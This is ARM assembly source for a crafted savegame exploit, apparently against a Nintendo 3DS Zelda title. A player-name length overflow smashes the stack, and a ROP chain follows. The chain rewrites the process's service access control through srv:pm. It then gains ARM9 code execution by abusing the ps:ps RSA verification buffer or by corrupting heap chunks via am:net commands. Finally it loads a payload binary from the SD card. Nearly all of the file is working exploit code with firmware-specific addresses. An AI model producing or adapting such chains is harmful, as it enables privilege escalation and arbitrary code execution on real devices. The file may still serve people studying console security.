.arm
.section .init
.global _start

//Note that all code addresses in the form of L_<addr> referenced here are for the USA game.

#define ROPKIT_TMPDATA 0x0FFFC000

#define ROPKIT_LINEARMEM_REGIONBASE 0x14000000

#define ROPKIT_LINEARMEM_BUF (ROPKIT_LINEARMEM_REGIONBASE+0x700000)

#define ROPKIT_MOUNTSAVEDATA

#include "ropkit_ropinclude.s"

#if REGION!=0//Non-JPN
#define srvinit_RegisterClient 0x30df98 //Calls srv_RegisterClient(), increments *r6, L_30aedc(sp+0), then executes "pop {r3, r4, r5, r6, r7, pc}". L_30aedc decreases *(inr0+8) by 1, and returns if that's >0 after decreasing it.
#else//JPN
#define srvinit_RegisterClient 0x30dab0
#endif

#define GETPROCID 0x409bec //Calls svcGetProcessId, "mov r0, r4", then pop {r3, r4, r5, pc}
#define CLOSEHANDLE 0x400ae4+4 //mov r4, r0. ptr = inr0, if(*ptr)svcCloseHandle(*ptr). *ptr = 0, r0 = ptr, "pop {r4, pc}".

#if REGION!=0//Non-JPN
#define THROWFATALERR 0x3351b4
#define GETTHREADSTORAGE 0x2db5ac //Stores r0 from "mrc 15, 0, r0, cr13, cr0, {3}" to r3+4, increments the word @ r3+8, r0=1 then pop {r4} bx	lr
#define ADDSHIFTVAL_BLXR3 0x3201dc //r4 = r0 + r1<<2. classptr = *(r5+0x38). Calls vtable funcptr +16 with r3 for the funcptr, r2=*r4, r1=<ptr loaded from pool>
#else//JPN
#define THROWFATALERR 0x334ccc
#define GETTHREADSTORAGE 0x2db0c4
#define ADDSHIFTVAL_BLXR3 0x31fcf4
#endif

#define RSAINFO_OFF 0x880+0x40

#define SRVACCESS_OFF 0xf00 //Savegame offset for the new service access control.
#define ARM9CODE_OFF 0xb00+0x40
#define ARM9CODE_SIZE 0x200-0x40
#define ARM11CODE_OFF 0xd00
#define ARM11CODE_SIZE 0x300

#define HAXWORD 0x58584148

#if EXECHAX==0 || EXECHAX==3
#define ARM9HAX 1
#endif

#if ARM9HAX==1
#define REPLACE_SRVACCESSCONTROL
#endif

#ifdef ARM9HAX
#if FWVER != 0x1F && FWVER != 0x18
#error "The specified FWVER is not supported."
#endif

#if FWVER == 0x1F
#define PXIFS_STATEPTR 0x0809797c
#define ARM9_ARCHIVE_MNTSD 0x8061451
#define ARM9_GETARCHIVECLASS 0x8063f91
#define DATAOUTCLASS_VTABLEPTR 0x080944c8

#define PXIPS9_BUF 0x080c3ee0
#elif FWVER == 0x18
#define PXIFS_STATEPTR 0x080c473c
#define ARM9_ARCHIVE_MNTSD 0x806145d
#define ARM9_GETARCHIVECLASS 0x8064029
#define DATAOUTCLASS_VTABLEPTR 0x08094328

#define PXIPS9_BUF 0x080c4420
#endif
#endif

#define PSPS_SIGBUFSIZE 0x7440//This is for FW1F. FW0B=0xD9B8.

#if EXECHAX==3
//These addresses are for FW1F.
#define HEAPHAX_HEAPCTX 0x80a2e80
#define HEAPHAX_HEAPBUF HEAPHAX_HEAPCTX-0x2800//Addr of the ARM9 heap buffer where the input data for amnet cmd 0x08190108 is copied to.
#define DIFF_FILEREAD_FUNCPTR 0x080952c0+8//This is the addr of the funcptr used by the DIFF verification code for reading data, via a class vtable.
#define DIFF_FILEREAD_FUNCADR 0x08065275//The original func addr from the above funcptr, before it's overwritten.
#define HEAPHAX_INPUTBUF 0x08000000
#define HEAPHAX_BUFSIZE 0x2800
#define HEAPCHUNK_SAVEOFF 0xf80
#define HEAPOFF_ARM9CODE 0x4
#endif

.macro SENDCMD HANDLE, CMDID, BUF
CALLFUNC_NOSP GETTHREADSTORAGE, 0, 0, 0, ROPBUF+0x1040

.word 0 @ r4 popped by GETTHREADSTORAGE

ROP_LOADR0_FROMADDR ROPBUF+0x1044

ROP_SETR1 0x20

.word POP_R4R5R6PC

.word 0 @ r4
.word ROPBUF+0x1018 @ r5, +0x38 is a classptr.
.word 0 @ r6
.word ADDSHIFTVAL_BLXR3

.word \CMDID @ r0, CmdID
.word \BUF @ r1, 0x80-byte buf copied to cmdbuf+4
.word 0 @ r2
.word 0 @ r3
.word 0 @ sl
.word 0 @ ip
.word POP_R5R6PC

.word \HANDLE @ r5, Handle*
.word 0 @ r6
.word ROP_SENDCMDADDR

.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
#if EXECHAX!=3 //The .ctx install command will return an error since the input data is invalid, therefore disable this conditional fatal-error call when using the .ctx install cmd hax.
COND_THROWFATALERR
#endif
.endm

_start:
.word 0xbb, 0x01, 0x8000, 0xe0ba, 0x1, 0x57, 0x57
.hword 0x48, 0x61, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78 @ UTF-16 "Haxxxxxx"
.byte 0x9a + 0x2 /* + 0x14*/ @ Length of player-name in utf16-chars, so byte-size is u8 value<<1. The player-name string is copied to the output buffer using lenval<<1, without checking the size or for NUL-termination. With the length used here, this results in a stack-smash once in-game function(s) load this string(see README).
.byte 0x01, 0x02, 0x00
.ascii "ZELDAZ"
.hword 0x428
.word 0xdfdfdfdf
.word 0x8 @ This value overwrites the utf16 string-length u32 stored in the ctx when the player-name is copied to the ctx, therefore use a value which won't cause other crashes.

.byte 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x02, 0x60, 0xf4, 0x01, 0x00, 0x00
.byte 0x65, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x3b, 0x06, 0x0f, 0x02
.byte 0x27, 0x06, 0x0d, 0x02, 0x17, 0x00, 0x22, 0x11, 0x3c, 0x0f, 0x45, 0x02
.byte 0x0b, 0x0d, 0x18, 0x02, 0x09, 0x00, 0x32, 0x13, 0x00, 0x00, 0x00, 0x00
.word 0x00, 0x00, 0x00
.byte 0x00, 0x00, 0x34, 0x00, 0x3c, 0x03, 0x45, 0x02, 0x0b, 0x03, 0x18, 0x02
.byte 0x09, 0x00, 0x32, 0x11, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x08
.byte 0x09, 0x0b, 0xff, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x1a, 0x18
.byte 0x18, 0xff, 0x2e, 0x27, 0x45, 0x46, 0x14, 0x1e, 0x0f, 0x22, 0x00, 0x00
.byte 0x1c, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x09, 0x73, 0x77
.byte 0xcb, 0xe2, 0x24, 0x00, 0xff, 0xff, 0xff, 0x30, 0x06, 0x06, 0x06, 0x07
.byte 0x07, 0x07, 0x07, 0x07, 0x06, 0x06, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00
.byte 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00
.byte 0x00, 0xff, 0xff, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0xff, 0xff, 0x14
.byte 0x43, 0x00, 0x00, 0x00, 0x7f, 0x00, 0x00, 0x00, 0xff, 0x9f, 0x79, 0x82
.byte 0x50, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
.byte 0xff, 0x07, 0x00, 0x00, 0xf8, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x00
.byte 0xff, 0xdf, 0x36, 0xef, 0x60, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
.byte 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00
.byte 0xff, 0x07, 0x00, 0x00, 0xff, 0xdf, 0x7f, 0xb7
.word 0x6f40, 0x4, 0x0
.word 0x7fff, 0xc0, 0xfa6f, 0xf3f7e3ff
.word 0x253060

@ This is the word which overwrites the saved LR with the stack-smash, thus this is the start of the ROP-chain. This is located at offset 0x14c in the savefile, relative to the playername string it's +0x130.

.word ROP_POPR3_ADDSPR3_POPPC @ Stack-pivot to ropstackstart.
.word (ROPBUF + (ropstackstart - _start)) - (0x0ffffcc0+0x4)

.space (_start + 0x180) - .
ropstackstart:

#ifdef REPLACE_SRVACCESSCONTROL
@ r0 = Address of the "srv:" handle(0x00558ad4).
CALLFUNC_NOSP CLOSEHANDLE, 0x00558ad4, 0, 0, 0

.word 0 @ r4

@ Outhandle is @ 0x00558ad4.
@ 0x4e7480 is "srv:", 0x4e7485 is "srv:pm".
CALLFUNC_NOSP svcConnectToPort, 0x00558ad4, 0x4e7485, 0, 0

COND_THROWFATALERR

.word POP_R4R5R6PC
.word 0 @ r4
.word 0 @ r5
.word ROPBUF+0x13bc @ r6
.word srvinit_RegisterClient

.word ROPBUF+0x13bc @ r3/sp0
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6
.word 0 @ r7

CALLFUNC_NOSP GETPROCID, ROPBUF+0x1080, 0xffff8001, 0, 0

.word 0, 0, 0

SENDCMD 0x00558ad4, 0x04040040, ROPBUF+0x1080 @ Unregister this process from srv:pm.
SENDCMD 0x00558ad4, 0x04030082, ROPBUF+0x1080 @ Register this process with srv:pm, with new service access control.
#endif

#if EXECHAX==0
@ Get the session handle for "ps:ps", outhandle @ ROPBUF+0x1040.
CALLFUNC_NOSP SRV_GETSERVICEHANDLE, ROPBUF+0x1040, (ROPBUF+SRVACCESS_OFF + 0x9*8), 5, 0

COND_THROWFATALERR

@ Copy the ARM9 code to the beginning of the signature buffer.
CALLFUNC_NOSP MEMCPY, 0x08000000, ROPBUF+ARM9CODE_OFF, ARM9CODE_SIZE, 0

CALLFUNC_NOSP MEMSET32_OTHER+4, 0x08000000+0x200, PSPS_SIGBUFSIZE-0x200, PXIPS9_BUF, 0

SENDCMD ROPBUF+0x1040, 0x00020244, ROPBUF+0x1100

.word THROWFATALERR

#endif

#if EXECHAX==3
@ Get the session handle for "am:net", outhandle @ ROPBUF+0x1040.
CALLFUNC_NOSP SRV_GETSERVICEHANDLE, ROPBUF+0x1040, (ROPBUF+SRVACCESS_OFF + 0xb*8), 6, 0

COND_THROWFATALERR

CALLFUNC_NOSP MEMSET32_OTHER+4, HEAPHAX_INPUTBUF, HEAPHAX_BUFSIZE, 0xffffffff, 0

@ Copy the RSA-2048 "cert" used to trigger an error so that the .ctx install cmd aborts processing the cert buffer data.
CALLFUNC_NOSP MEMCPY, HEAPHAX_INPUTBUF, ROPBUF+RSAINFO_OFF, 0x280, 0

@ Copy the ARM9 code.
CALLFUNC_NOSP MEMCPY, HEAPHAX_INPUTBUF+HEAPOFF_ARM9CODE, ROPBUF+ARM9CODE_OFF, ARM9CODE_SIZE, 0

@ Copy the memchunk header.
CALLFUNC_NOSP MEMCPY, HEAPHAX_INPUTBUF+HEAPOFF_ARM9CODE+0x200+0x88, ROPBUF+HEAPCHUNK_SAVEOFF, 0x10, 0

@ Copy the heap memctx data to heapbuf+0x2800.
CALLFUNC_NOSP MEMCPY, HEAPHAX_INPUTBUF+0x2800, ROPBUF+HEAPCHUNK_SAVEOFF+0x10, 0x3c+8, 0

SENDCMD ROPBUF+0x1040, 0x08190108, ROPBUF+0x1180 @ CTX install cmd
SENDCMD ROPBUF+0x1040, 0x00190040, ROPBUF+0x1200 @ ReloadDBS

.word HAXWORD
#endif

#if EXECHAX==1 //This code exec method reads save00.bin to .text. This only works prior to system version 4.0.0-7, with FW1D/4.0.0-7 this causes a kernel panic.
CALLFUNC_NOSP FS_MountSavedata, (ROPBUF + (savedata_archivename - _start)), 0, 0, 0

CALLFUNC_NOSP IFile_Open, ROPBUF+0x1044, ROPBUF+0x1000, 1, 0

CALLFUNC_NOSP IFile_Read, ROPBUF+0x1044, ROPBUF+0x1048, 0x2cd2b4, ARM11CODE_OFF+ARM11CODE_SIZE

ROPMACRO_IFile_Close ROPBUF+0x1044

.word 0x2cd2b4+ARM11CODE_OFF
#endif

#if EXECHAX==2
#include "ropkit_boototherapp.s"

ropkit_cmpobject:
.word (ROPBUF + (ropkit_cmpobject - _start) + 0x4) @ Vtable-ptr
.fill (0x40 / 4), 4, ROP_POPR3_ADDSPR3_POPPC @ Vtable
#endif

#if EXECHAX==0
.space (_start + RSAINFO_OFF) - . @ ps:ps RSA ctx
.space (_start + RSAINFO_OFF + 0x200) - . @ RSA modulo and exponent = zeros.
.word PSPS_SIGBUFSIZE<<3 @ RSA bit-size, for the signature.
.word 0
#elif EXECHAX==3
.space (_start + RSAINFO_OFF) - . @ RSA-4096 "cert", used with the .ctx install cmd.
.word 0x3000100 @ Big-endian signature-type 0x10003, for RSA-4096 SHA256.
.space (_start + RSAINFO_OFF + 0x280) - .
#endif

#ifdef ARM9HAX
.space (_start + ARM9CODE_OFF) - . @ ARM9 code
#if EXECHAX==3
b arm9code
.word 0, 0, 0 @ For heaphaxx, branch around the data overwritten by the ARM9 CTR-SDK heap code.
#endif
arm9code:
push {r0, r1, r2, r3, r4, r5, r6, r7, lr}
sub sp, sp, #48

sub r1, pc, #12
ldr r0, =0xffff8001
mov r2, #ARM9CODE_SIZE
svc 0x00000054

orr ip, pc, #1
bx ip

.thumb
ldr r5, =PXIFS_STATEPTR
ldr r5, [r5]
add r5, r5, #8 @ r5 = state
ldr r1, =0x2EA0
add r0, r5, r1
add r1, sp, #8
ldr r4, =ARM9_ARCHIVE_MNTSD
blx r4

mov r3, #0
str r3, [sp, #28]
str r3, [sp, #0]
str r3, [sp, #4]
add r0, sp, #16
mov r1, r5
ldr r2, [sp, #8]
ldr r3, [sp, #12]
ldr r4, =ARM9_GETARCHIVECLASS
blx r4

ldr r6, [sp, #28]

add r0, sp, #36
mov r1, #4
str r1, [r0]
mov r1, #0x22
str r1, [r0, #8]
adr r1, arm9_filepath
str r1, [r0, #4]

mov r0, #0
str r0, [sp, #32]
mov r3, #1
str r3, [sp, #0]
str r0, [sp, #4]
add r1, sp, #32
mov r2, #0
add r3, sp, #36
mov r0, r6
ldr r4, [r0]
ldr r4, [r4, #8]
blx r4 //openfile

ldr r7, [sp, #32]

mov r0, r7
add r1, sp, #20
ldr r4, [r7]
ldr r4, [r4, #16]
blx r4 //getfilesize

mov r0, r7
adr r1, arm9_loadaddr
mov r2, #4
mov r3, #0
bl fileread

mov r0, r7
ldr r1, arm9_loadaddr
ldr r2, [sp, #20]
sub r2, r2, #4
mov r3, #4
bl fileread

cmp r0, #0
bne arm9fail

ldr r0, =0xffff8001
ldr r1, arm9_loadaddr
ldr r2, [sp, #20]
sub r2, r2, #4
blx svcFlushProcessDataCache

add sp, sp, #48

ldr r0, arm9_loadaddr
blx r0

#if EXECHAX==3
ldr r0, [sp, #0x24]
bl heaphaxa9_restoreheap
ldr r0, =DIFF_FILEREAD_FUNCPTR
ldr r1, =DIFF_FILEREAD_FUNCADR
str r1, [r0]
#endif

ldr r0, [sp, #0x20]
mov lr, r0
pop {r0, r1, r2, r3, r4, r5, r6, r7}
add sp, sp, #4

#if EXECHAX==3
ldr r7, =DIFF_FILEREAD_FUNCADR
bx r7
#endif

arm9code_end:
b arm9code_end
.pool

arm9fail:
ldr r0, =HAXWORD
blx r0
.pool

fileread:
push {r3, r4, lr}
sub sp, sp, #24
add r3, sp, #16
str r2, [sp, #8]
ldr r2, =DATAOUTCLASS_VTABLEPTR
str r2, [r3]
str r1, [r3, #4]
str r3, [sp, #0]
mov r1, #0
str r1, [sp, #4]
add r1, sp, #12
ldr r2, [sp, #24]
mov r3, #0

ldr r4, [r0]
ldr r4, [r4, #0x38]
blx r4 //readfile
add sp, sp, #24
pop {r3, r4, pc}
.pool

#if EXECHAX==3
heaphaxa9_restoreheap:
push {r4}
sub r0, r0, #0x10 @ r0 = DU chunkhdr for the save-read output buffer.
mov r1, #0xf
mvn r1, r1 @ r1 = -0x10
str r1, [r0, #4] @ Set the DU chunkhdr chunk-size to -0x10. if(((DUchunkhdr_addr + 0x10 + chunksize) - RFchunkhdradr) < 0x10)this triggers return 0 from RF chunk mem free code without writing to heap chunkhdrs/memctx ptrs. The DU chunkhdr here is located 0x4 bytes after the RF chunkhdr due to alignment.

ldr r0, =(HEAPHAX_HEAPCTX + 24 + 0x24)
ldr r1, [r0, #8] @ r1 = addr of first heap DU chunkhdr.

heaphaxa9_restoreheap_findheapendDU: @ r1 = last DU chunkhdr in the linked-list.
cmp r1, #0
beq heaphaxa9_restoreheap_end
ldr r2, [r1, #12]
cmp r2, #0
beq heaphaxa9_restoreheap_findheapendDU_finish
mov r1, r2
b heaphaxa9_restoreheap_findheapendDU

heaphaxa9_restoreheap_findheapendDU_finish:
ldr r1, [r1, #8] @ Since this code is executed before the output-buf DU chunk is unlinked which was allocated via the heaphax RF chunk, the last chunk is the output-buf DU chunk. Therefore, set r1 to the DU chunkhdr which was originally the last chunkhdr in the linked-list, prior to using the ReloadDBS command.
cmp r1, #0
beq heaphaxa9_restoreheap_end

ldr r3, =0x4652 @ "RF"
mov r4, #2
heaphaxa9_restoreheap_findRF:
add r1, r1, #4
ldr r2, [r1]
cmp r2, r3
beq heaphaxa9_restoreheap_findRF_found
b heaphaxa9_restoreheap_findRF @ Find the RF chunkhdr following the above DU chunkhdr, which doesn't have a DU chunkhdr immediately after this RF chunkhdr.
heaphaxa9_restoreheap_findRF_found:
sub r4, r4, #1
cmp r4, #0
bgt heaphaxa9_restoreheap_findRF

str r1, [r0, #0] @ Write the above RF memchunkhdr ptr to the heapctx RF chunkhdr ptrs.
str r1, [r0, #4]

heaphaxa9_restoreheap_end:
pop {r4}
bx lr
.pool
#endif

.arm
svcFlushProcessDataCache:
svc 0x00000054
bx lr
#endif

#ifdef ARM9HAX
arm9_filepath:
.hword 0x2F, 0x33, 0x64, 0x73, 0x68, 0x61, 0x78, 0x5F, 0x61, 0x72, 0x6D, 0x39, 0x2E, 0x62, 0x69, 0x6E, 0x00 //UTF-16 "/3dshax_arm9.bin"
.align 2

arm9_loadaddr:
.word 0

.space (_start + ARM9CODE_OFF + ARM9CODE_SIZE) - . @ ARM9 code section end.
#endif

#ifdef REPLACE_SRVACCESSCONTROL
.space (_start + SRVACCESS_OFF) - . @ New service access control
.ascii "APT:U"

.space (_start + SRVACCESS_OFF + 0x1*8) - .
.ascii "y2r:u"

.space (_start + SRVACCESS_OFF + 0x2*8) - .
.ascii "gsp::Gpu"

.space (_start + SRVACCESS_OFF + 0x3*8) - .
.ascii "ndm:u"

.space (_start + SRVACCESS_OFF + 0x4*8) - .
.ascii "fs:USER"

.space (_start + SRVACCESS_OFF + 0x5*8) - .
.ascii "hid:USER"

.space (_start + SRVACCESS_OFF + 0x6*8) - .
.ascii "dsp::DSP"

.space (_start + SRVACCESS_OFF + 0x7*8) - .
.ascii "cfg:u"

.space (_start + SRVACCESS_OFF + 0x8*8) - .
.ascii "fs:REG"

.space (_start + SRVACCESS_OFF + 0x9*8) - .
.ascii "ps:ps"

.space (_start + SRVACCESS_OFF + 0xa*8) - .
.ascii "ns:s"

.space (_start + SRVACCESS_OFF + 0xb*8) - .
.ascii "am:u"//"am:net"
#endif

#if EXECHAX==3
.space (_start + HEAPCHUNK_SAVEOFF) - .
.word 0x4652 @ "RF"
.word 0x150 @ Available free space following this chunk header.
.word DIFF_FILEREAD_FUNCPTR-12 @ prev memchunk ptr
.word HEAPHAX_HEAPBUF+HEAPOFF_ARM9CODE @ next memchunk ptr, arm9 code addr.

.word 0x08093920 @ Heap memctx
.word 0, 0, 0, 0, 0
.word 0x45585048
.word 0, 0, 0, 0
.word 0x00040000
.word 0x080A2EE4   
.word 0x080B5280
.word 0
.word HEAPHAX_HEAPBUF+HEAPOFF_ARM9CODE+0x200+0x88, HEAPHAX_HEAPBUF+HEAPOFF_ARM9CODE+0x200+0x88 @ RF chunk ptrs
#endif

#if EXECHAX==1
.space (_start + 0x1000) - .
.hword 0x64, 0x61, 0x74, 0x61, 0x3A, 0x2F, 0x73, 0x61, 0x76, 0x65, 0x30, 0x30, 0x2E, 0x62, 0x69, 0x6E, 0x00
.align 2

savedata_archivename:
.string "data:"
.align 2
#endif

#ifdef REPLACE_SRVACCESSCONTROL
.space (_start + 0x1080) - . @ srv:pm cmd
.word 0 @ ProcessID
.word 0x18 @ Service access control size, in words
.word 0x180002
.word ROPBUF+SRVACCESS_OFF @ Service access control ptr
#endif

#if EXECHAX==0
.space (_start + 0x1100) - . @ ps:ps VerifyRsaSha256 0x00020244 cmd, for FW1F
//.word 1
.word 0, 0, 0, 0, 0, 0, 0, 0 @ SHA256 hash
.word 0
.word 0x00820002 @ ((Ctx size<<14) | 2), for size 0x208.
.word ROPBUF+RSAINFO_OFF @ Ctx
.word (PSPS_SIGBUFSIZE<<4) | 10
.word 0x08000000 @ Signature
#endif

#if EXECHAX==3
.space (_start + 0x1180) - . @ cmd data for am:net command 0x08190108.
.word 0xa00 @ Buf0 size
.word 0xa00, 0xa00, 0xa00 + 0x3c + 8 @ Buf1size-buf3size
.word (0xa00<<4) | 10
.word HEAPHAX_INPUTBUF @ Buf0 addr
.word (0xa00<<4) | 10
.word HEAPHAX_INPUTBUF + (0xa00*1) @ Buf1 addr
.word (0xa00<<4) | 10
.word HEAPHAX_INPUTBUF + (0xa00*2) @ Buf2 addr
.word ((0xa00 + 0x3c + 8)<<4) | 10
.word HEAPHAX_INPUTBUF + (0xa00*3) @ Buf3 addr
#endif

#if EXECHAX==3
.space (_start + 0x1200) - . @ cmd data for am:net command 0x00190040 ReloadDBS.
.word 1 @ Mediatype = SD
#endif

.space (_start + 0x13bc) - .
.word 2012, 10, 22 @ Datetime displayed on the save-file select screen.
.word 13, 8

.space (_start + 0x14dc) - .

